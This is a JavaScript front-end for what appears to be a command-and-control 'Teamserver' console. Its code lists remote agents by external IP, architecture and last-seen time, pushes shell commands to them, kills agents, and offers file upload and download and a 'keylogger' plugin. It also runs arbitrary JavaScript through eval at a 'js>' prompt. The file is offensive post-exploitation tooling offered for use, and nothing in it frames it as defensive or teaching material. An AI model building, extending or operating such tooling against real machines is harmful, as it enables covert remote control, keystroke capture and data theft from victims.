// Globals
var commands;

var Actions = {
	SERVER_AGENT_RM:	1,
	SERVER_LISTENER_RM:	2,
	AGENT_SHELL:		10,
	AGENT_FILE_UP:		11,
	AGENT_FILE_DOWN:	12,
	AGENT_PLUGIN_PUSH:	13,
	AGENT_LIB_PUSH:		14,
};
var NO_SERVICE = -1;
var current_svc = NO_SERVICE;

// Functions

function contextCbDisabled() { return false; }

function agentSendAction(act, rest, id) {
	// Shell command
	if (act == Actions.AGENT_SHELL) {
		// AJAX post.php
		$.ajax({url: '/ajax/post.php', type: "POST", dataType: 'text', data: {"type": "shell_cmd", "agent_id": id, "cmd": rest}, 
	success: function(data) { $.terminal.active().echo(data);}});
	} else if (act == Actions.SERVER_AGENT_RM) {
		$.ajax({url: '/ajax/post.php', type: "POST", dataType: 'text', data: {"type": "agent_rm", "agent_id": id}, 
	success: function(data) { $.terminal.active().echo(data);}});
	}
}

function loadListenerContexts() {
        $.contextMenu({
                selector: 'button.listener-btn',
                build: function($triggerElement, e) {
                        return {
                                callback: function(){},
                                items: {
                                        item_module: {name: "Module: " + $triggerElement.attr("data-module"), className: 'contextmenu-info', disabled: true},
                                        item_category: {name: "Category: " + $triggerElement.attr("data-category"), className: 'contextmenu-info', disabled: true},
					sep1: "---------",
					action_stop: {name: "Stop"}
                                }
                        };
                }
        });
}
function agentCb(agent_name) {
    alert(agent_name);
    commands['svc.interact']['args'].indexOf(agent_name) === -1 ? commands['svc.interact']['args'].push(agent_name) : console.log('skipping element ' + agent_name);
}
function loadAgentContexts() {
        $.contextMenu({
                selector: 'button.agent-btn',
                build: function($triggerElement, e) {
                        return {
				callback: function(key, opts, root, e, agentid=$triggerElement.data("name")) {
										console.log(typeof(key));
										if(key == 'action_clear') key = Actions.SERVER_AGENT_RM;
										agentSendAction(key, null, agentid);
									},
                                items: {
					item_lastseen: {name: "Last Seen: " + $triggerElement.data("lastseen"), className: 'contextmenu-info', disabled: true},
                                        item_arch: {name: "Arch: " + $triggerElement.data("arch"), className: 'contextmenu-info', disabled: true},
                                        item_ext_ip: {name: "External IP: " + $triggerElement.data("ext_ip"), className: 'contextmenu-info', disabled: true},
					sep1: "---------",
					action_clear: {name: "Clear", post_nm: Actions.SERVER_AGENT_RM, agentId: $triggerElement.data("name")},
					action_kill: {name: "Kill"}
                                }
                        };
                }
        });
}

function docReadyCb($) {
    setInterval(function(){$.ajax({url: '/ajax/get.php', type: "POST", dataType: 'json', data: {"type": "all_agents", "hash": $('#agents-body').data('hash')}, 
	success: function(data) {
		$('#agents-body').data('hash', data.hash);
		$('#agents-body').html(function() { return data.html })}})}, 2000); 
    setInterval(function(){$.ajax({url: '/ajax/get.php', type: "POST", dataType: 'json', data: {"type": "all_listeners", "hash": $('#listeners-body').data('hash')}, 
	success: function(data) {
		$('#listeners-body').data('hash', data.hash);
		$('#listeners-body').html(function() { return data.html }); 
				}})}, 2000); 
    var id = 1;
    var match_tolerance = 1;
    var ul;
    var empty = { options: [], args: [] };
    commands = {
	'svc.interact': {options: [], args: svcs},
	'svc.rates': {options: ['-s'], args: []},
	'svc.shell': empty,
	'svc.kill': empty,
	'svc.plugin': {options: ['-p'], args: ['terminal', 'keylogger']},
	'file.ls': empty,
	'file.upload': empty,
	'file.download': empty
	// PLUGIN COMMANDS CAN BE PUSHED HERE
    };
    $('div.agent-interact-body').terminal(function(command, term) {
	var cmd = $.terminal.parse_command(command);
	// PLUGIN COMMAND LOGIC SHOULD BE RETRIEVED VIA AJAX, ADDED IN THIS FUNCTION (might need to reload terminal?)
	if (command == 'help') {
            term.echo("begin typing a command to see completions");
        } else if (cmd.name == 'svc.interact') {
	    if (svcs.indexOf(cmd.rest) === -1) {
		term.echo("Agent with ID " + cmd.rest + " not found");	
	    } else {
	    	term.set_prompt(prompt_user + '@' + cmd.rest + '> ');
		current_svc = cmd.rest;
	    }
        } else if (cmd.name == 'svc.shell') {
	    if (current_svc == NO_SERVICE) {
		term.echo("Interact with an agent to push a shell command.");
	    } else {
		agentSendAction(Actions.AGENT_SHELL, cmd.rest, current_svc);
	    }
	} else if (command == "js") {
            term.push(function(command, term) {
                var result = window.eval(command);
                if (result != undefined) {
                    term.echo(String(result));
                }
            }, {
                name: 'js',
                prompt: 'js> '});
        } else if (command == 'mysql') {
            term.echo("unsupported");
	} else {
            term.echo("unknown command " + command);
        }
    }, {
	onInit: function(term) {
		var wrapper = term.cmd().find('.cursor').wrap('<span/>').parent().addClass('cmd-wrapper');
		ul = $('<ul></ul>').appendTo(wrapper);
		ul.on('click', 'li', function() {
			term.insert($(this).text());
			ul.empty();
		});
	},
        greetings: "Teamserver Console v0.1",
	prompt: prompt_user + "@Teamserver> ",
keydown: function(e) {
	var term = this;

	setTimeout(function() {
		ul.empty();
		var command = term.get_command();
		var name = command.match(/^([^\s]*)/)[0];
		if (name) {
			var word = term.before_cursor(true);
			var regex = new RegExp('^' + $.terminal.escape_regex(word));
			var list;
			if (name == word) {
				list = Object.keys(commands);
			} else if (command.match(/\s/)) {
				if (commands[name]) {
					if (word.match(/^--/)) {
						list = commands[name].options.map(function(option) {
							return '--' + option;
						});
					} else {
						list = commands[name].args;
					}
				}
			}
			if (word.length >= match_tolerance && list) {
				var matched = [];
				for (var i=list.length; i--;) {
					if (regex.test(list[i])) {
						matched.push(list[i]);
					}
				}

				var insert = false;
				if (e.which == 9) {
					insert = term.complete(matched);
				}
				if (matched.length && !insert) {
					ul.hide();
					for (var i=0; i<matched.length; ++i) {
						var str = matched[i].replace(regex, '');
						$('<li>' + str + '</li>').appendTo(ul);
					}
					ul.show();
				}
			}

		}
	}, 0);
	if (e.which == 9) {
		return false;
	}
}})}


jQuery(document).ready(docReadyCb($));
